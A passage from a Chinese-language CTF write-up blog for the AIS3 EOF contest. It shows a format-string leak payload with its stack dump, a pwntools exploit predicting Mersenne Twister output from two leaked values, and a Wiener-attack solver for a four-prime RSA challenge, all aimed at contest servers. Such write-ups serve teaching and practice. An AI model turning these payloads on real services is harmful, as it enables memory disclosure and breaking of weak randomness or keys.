number:&#x27;</span>)</span><br><span class="line">o.sendline(<span class="built_in">str</span>(lucky))</span><br><span class="line">o.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到shell之後是個簡單fmt漏洞，可以構造payload <code>%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p</code> 之類的來把stack上的buffer內容弄出來，附個那時的輸入輸出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p</span><br><span class="line"></span><br><span class="line">0x7ffede880a80,0x7f29558f88d0,0x1f,(nil),(nil),(nil),0x5566cb623260,0x696d34667b464f45,0x7431775f5234696c,0x3f78756e694c5f68,0xa7d3f3f,0x7f2955b1f4c0,0x7f2955906f5f,0x7f2955b25710,(nil),(nil),0x7ffede8b6298,0x1958ac0,0x7f29556be787,0x7ffede880ba0,0x7ffede8b6180,0x7f2900000002,(nil),0x7ffede880b00,0x3,0x7ffede880af0,(nil),0x7f2955b25738,(nil),0x1,0x7f2955b25710,(nil),0x6562b026,0x7f2955b25a98,0x7ffede880b98,0x7ffede880bd0,0x7f2955b25710,(nil),0x7f29559071ef,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x70252c70252c,0x7ffede880c70,0x264ee82d9e2a3000,0x5566c97e1820,0x7f295552cb97,0x1,0x7ffede880c78,0x100008000,0x5566c97e177a,(nil),0xc45d71bcb858051,0x5566c97e1670,0x7ffede880c70,(nil),(nil)</span><br></pre></td></tr></table></figure>
<p>最後p64還原成string後得到flag: <code>EOF&#123;f4mili4R_w1th_Linux???&#125;</code></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Lucky"><a href="#Lucky" class="headerlink" title="Lucky"></a>Lucky</h3><p>拿到一個python寫的腳本，然後我們可以連線上去跟他互動</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RNG</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.f = <span class="number">1812433253</span></span><br><span class="line">        (self.w, self.n, self.m, self.r) = (<span class="number">32</span>, <span class="number">624</span>, <span class="number">397</span>, <span class="number">31</span>)</span><br><span class="line">        self.a = <span class="number">0x9908b0df</span></span><br><span class="line">        (self.u, self.d) = (<span class="number">11</span>, <span class="number">0xffffffff</span>)</span><br><span class="line">        (self.s, self.b) = (<span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line">        (self.t, self.c) = (<span class="number">15</span>, <span class="number">0xefc60000</span>)</span><br><span class="line">        self.l = <span class="number">18</span></span><br><span class="line">        self.lower_mask = (<span class="number">1</span> &lt;&lt; self.r) - <span class="number">1</span></span><br><span class="line">        self.upper_mask = (<span class="number">1</span> &lt;&lt; self.r)</span><br><span class="line"></span><br><span class="line">        self.index = self.n + <span class="number">1</span></span><br><span class="line">        self.state = [<span class="number">0</span>]*self.n</span><br><span class="line">        self.seed = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">srand</span>(<span class="params">self, seed</span>):</span></span><br><span class="line">        self.seed = seed</span><br><span class="line">        self.state[<span class="number">0</span>] = seed &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, self.n):</span><br><span class="line">            self.state[i] = (self.f * (self.state[i-<span class="number">1</span>] ^ (self.state[i-<span class="number">1</span>] &gt;&gt; (self.w-<span class="number">2</span>))) + i) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rand</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.seed == <span class="literal">None</span>:</span><br><span class="line">            self.srand(random.randrange(<span class="number">1</span>, <span class="number">0xffffffff</span>))</span><br><span class="line">        <span class="keyword">if</span> self.index &gt;= self.n:</span><br><span class="line">            self.twist()</span><br><span class="line">        </span><br><span class="line">        y = self.state[self.index]</span><br><span class="line">        y = y ^ ((y &gt;&gt; self.u) &amp; self.d)</span><br><span class="line">        y = y ^ ((y &lt;&lt; self.s) &amp; self.b)</span><br><span class="line">        y = y ^ ((y &lt;&lt; self.t) &amp; self.c)</span><br><span class="line">        y = y ^ (y &gt;&gt; self.l)</span><br><span class="line"></span><br><span class="line">        self.index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> y &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twist</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n):</span><br><span class="line">            x = self.state[i] &amp; self.upper_mask</span><br><span class="line">            x += self.state[(i+<span class="number">1</span>) % self.n] &amp; self.lower_mask</span><br><span class="line">            xA = x &gt;&gt; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> x % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                xA ^= self.a</span><br><span class="line">            self.state[i] = self.state[(i+self.m) % self.n] ^ xA</span><br><span class="line">        self.index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">win</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;Congratulation!&#x27;</span>)</span><br><span class="line">    flag = <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    print(flag)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shuffle</span>(<span class="params">rng</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;How many times do you want to shuffle?&#x27;</span>)</span><br><span class="line">    n = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">&quot;Don&#x27;t mess with your luck &gt;:(&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        rng.rand()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span>(<span class="params">rng</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;Now guess the lucky number!&#x27;</span>)</span><br><span class="line">    n = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">    lucky_number = rng.rand()</span><br><span class="line">    print(<span class="string">&#x27;Lucky Number:&#x27;</span>, lucky_number)</span><br><span class="line">    print(<span class="string">&#x27;Your Guess:&#x27;</span>, n)</span><br><span class="line">    <span class="keyword">if</span> n == lucky_number:</span><br><span class="line">        win()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;Better luck next time :(&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    rng = RNG()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        shuffle(rng)</span><br><span class="line">        guess(rng)</span><br></pre></td></tr></table></figure>

<p>看了看發現是經典的mt19937實作，看起來跟mt19937的predict很有關係，所以看著<a target="_blank" rel="noopener" href="https://github.com/kmyk/mersenne-twister-predictor">Mersenne Twister Predictor
</a>跟<a target="_blank" rel="noopener" href="https://liam.page/2018/01/12/Mersenne-twister/">一篇中國人的Blog</a>研究了一下後發現我們可以預測mt19937是因為我們可以透過mt19937的輸出回復它當下某個register的內容，而正常那種需要624輸出的作法，就只是奠基在mt19937的register大小就是624，所以我們知道連續624的輸出之後就可以把整個mt19937的狀態記錄下來，接下來就只要模擬就好。</p>
<p>再定睛一看我們這題比較不一樣的是可以指定要第幾個register的內容，但是只能問兩次，接著就必須回答下一次的輸出。</p>
<p>觀察了一下mt19937做twist的部分，發現它會利用$r_i$的high bit跟$r_{i+1}$的low 31個bit算出一些東西後，把$r_i$變成$r_{i+397}$ xor 一些東西 (其中這裡的$r$代表mt19937的register)，所以我們就可以考慮預測twist後的那個$r_0$，這樣的話我們會需要twist前的$r_0, r_1, r_{397}$，不過$r_0$的部分我們只需要一個bit，所以可以直接random撞撞看就好了，這樣我們就只要兩個輸出就可以預測下一個輸出了XD</p>
<p>怎麼做的部分就是我們拿到輸出的第1個數跟第397個數(0-base)還原出$r_1, r_{397}$接著讓他剛好twist一遍，我們也照著模擬twist的操作就可以拿到twist後的$r_0$了XD</p>
<p>附個exploit</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># o = process(&#x27;./lucky&#x27;)</span></span><br><span class="line">o = remote(<span class="string">&#x27;eof.ais3.org&#x27;</span>, <span class="number">39091</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># untempering from </span></span><br><span class="line"><span class="comment"># https://github.com/kmyk/mersenne-twister-predictor/blob/master/mt19937predictor.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">untempering</span>(<span class="params">y</span>):</span></span><br><span class="line">    y ^= (y &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    y ^= (y &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">    y ^= ((y &lt;&lt;  <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>) ^ ((y &lt;&lt; <span class="number">14</span>) &amp; <span class="number">0x94284000</span>) ^ ((y &lt;&lt; <span class="number">21</span>) &amp; <span class="number">0x14200000</span>) ^ ((y &lt;&lt; <span class="number">28</span>) &amp; <span class="number">0x10000000</span>)</span><br><span class="line">    y ^= (y &gt;&gt; <span class="number">11</span>) ^ (y &gt;&gt; <span class="number">22</span>)</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    lower_mask = (<span class="number">1</span> &lt;&lt; <span class="number">31</span>) - <span class="number">1</span></span><br><span class="line">    upper_mask = (<span class="number">1</span> &lt;&lt; <span class="number">31</span>)</span><br><span class="line">    x0 = random.randint(<span class="number">0</span>, <span class="number">0xffffffff</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># shuffle 1 time to get x1</span></span><br><span class="line">    o.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    o.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="comment"># guess lol</span></span><br><span class="line">    o.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    o.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    o.recvuntil(<span class="string">&#x27;Lucky Number:&#x27;</span>)</span><br><span class="line">    x1 = untempering(<span class="built_in">int</span>(o.recvline().strip()))</span><br><span class="line">    print(<span class="string">&#x27;x1 = %d&#x27;</span> % x1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># shuffle 395 to get x397</span></span><br><span class="line">    o.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    o.sendline(<span class="string">&#x27;395&#x27;</span>)</span><br><span class="line">    <span class="comment"># guess lol</span></span><br><span class="line">    o.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    o.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    o.recvuntil(<span class="string">&#x27;Lucky Number:&#x27;</span>)</span><br><span class="line">    x397 = untempering(<span class="built_in">int</span>(o.recvline().strip()))</span><br><span class="line">    print(<span class="string">&#x27;x397 = %d&#x27;</span> % x397)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># shuffle 624 - 397 to twist</span></span><br><span class="line">    o.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    o.sendline(<span class="string">&#x27;226&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># twist</span></span><br><span class="line">    y = x0 &amp; upper_mask</span><br><span class="line">    y += x1 &amp; lower_mask</span><br><span class="line">    yA = y &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> y % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        yA ^= <span class="number">0x9908b0df</span></span><br><span class="line">    y = x397 ^ yA</span><br><span class="line">    y = y ^ ((y &gt;&gt; <span class="number">11</span>) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">    y = y ^ ((y &lt;&lt;  <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>)</span><br><span class="line">    y = y ^ ((y &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span>)</span><br><span class="line">    y = y ^  (y &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    y &amp;= <span class="number">0xffffffff</span></span><br><span class="line">    </span><br><span class="line">    o.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    o.sendline(<span class="built_in">str</span>(y))</span><br><span class="line">    o.interactive()</span><br></pre></td></tr></table></figure>

<p>最後Flag: <code>EOF&#123;4noTh3r_m3tH0d_t0_Br3aK_M3rSeNne_tWistEr&#125;</code> </p>
<h3 id="Art"><a href="#Art" class="headerlink" title="Art"></a>Art</h3><p>一樣拿到一個python寫的腳本，然後我們可以連線上去跟他互動</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">nbit = <span class="number">384</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (a, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    g, x, y = gcd(b, a % b)</span><br><span class="line">    <span class="keyword">return</span> (g, y - (a // b) * x, x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a, m</span>):</span></span><br><span class="line">    g, x, y = gcd(m, a)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>():</span></span><br><span class="line">    x, y, z, u = [getPrime(nbit) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    phi = (x-<span class="number">1</span>)*(y-<span class="number">1</span>)*(z-<span class="number">1</span>)*(u-<span class="number">1</span>)</span><br><span class="line">    n = x*y*z*u</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d = getRandomInteger(<span class="number">192</span>)</span><br><span class="line">        e = modinv(d, phi)</span><br><span class="line">        <span class="keyword">if</span> e == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> [n, e], [x, y, z, u]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    pub, pri = gen()</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">f&#x27;n = <span class="subst">&#123;pub[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">f&#x27;e = <span class="subst">&#123;pub[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        factor = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;give me one prime factor of n : &#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> factor <span class="keyword">in</span> pri:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;correct!&#x27;</span>)</span><br><span class="line">            <span class="keyword">del</span> pri[pri.index(factor)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;you need a stronger machine to bruteforce, here is your link : https://aws.amazon.com/ec2/pricing/on-demand/?nc1=h_ls&#x27;</span>)</span><br><span class="line">            exit(<span class="number">255</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;nice, here is your flag:&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="built_in">print</span> (f.read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>發現是個四個質數的RSA，而且$d$特別的小，所以就在想可不可以做Wiener’s attack</p>
<p>然而看了<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Wiener%27s_attack">wikipedia</a>，只覺得可以拿到$\varphi(N), d$，但是不像兩個質數的RSA，我構造不出一個方式可以分解$N$，後來是google <code>wiener attack multiple factor</code>，看到一篇<a target="_blank" rel="noopener" href="https://link.springer.com/content/pdf/10.1007/3-540-36492-7_25.pdf">文章</a>，裡面給出了一種類似miller rabin的做法可以分解$N$，來證明拿到$d$其實跟分解$N$差不多難，同時它也有給出好的機率證明它的演算法。</p>
<p>最後照著寫了一波就做完了w</p>
<p>sol.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> wiener</span><br><span class="line"></span><br><span class="line"><span class="comment"># o = process(&#x27;./run.py&#x27;)</span></span><br><span class="line">o = remote(<span class="string">&#x27;ais3eof.zoolab.org&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">o.recvuntil(<span class="string">&#x27;n = &#x27;</span>)</span><br><span class="line">N = <span class="built_in">int</span>(o.recvline().strip())</span><br><span class="line">o.recvuntil(<span class="string">&#x27;e = &#x27;</span>)</span><br><span class="line">e = <span class="built_in">int</span>(o.recvline().strip())</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;N = %d&#x27;</span> % N)</span><br><span class="line">print(<span class="string">&#x27;e = %d&#x27;</span> % e)</span><br><span class="line">d, phi = wiener.get_d_phi(N, e)</span><br><span class="line">print(<span class="string">&#x27;d = %d&#x27;</span> % d)</span><br><span class="line">print(<span class="string">&#x27;phi = %d&#x27;</span> % phi)</span><br><span class="line"><span class="keyword">if</span> d != -<span class="number">1</span>:</span><br><span class="line">    a, b, c, d = wiener.factorize4(e, d, N)</span><br><span class="line">    o.recvuntil(<span class="string">&#x27;give me one prime factor of n&#x27;</span>)</span><br><span class="line">    o.sendline(<span class="built_in">str</span>(a))</span><br><span class="line">    o.recvuntil(<span class="string">&#x27;give me one prime factor of n&#x27;</span>)</span><br><span class="line">    o.sendline(<span class="built_in">str</span>(b))</span><br><span class="line">    o.recvuntil(<span class="string">&#x27;give me one prime factor of n&#x27;</span>)</span><br><span class="line">    o.sendline(<span class="built_in">str</span>(c))</span><br><span class="line">    o.recvuntil(<span class="string">&#x27;give me one prime factor of n&#x27;</span>)</span><br><span class="line">    o.sendline(<span class="built_in">str</span>(d))</span><br><span class="line">    o.interactive()</span><br></pre></td></tr></table></figure>

<p>wiener.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 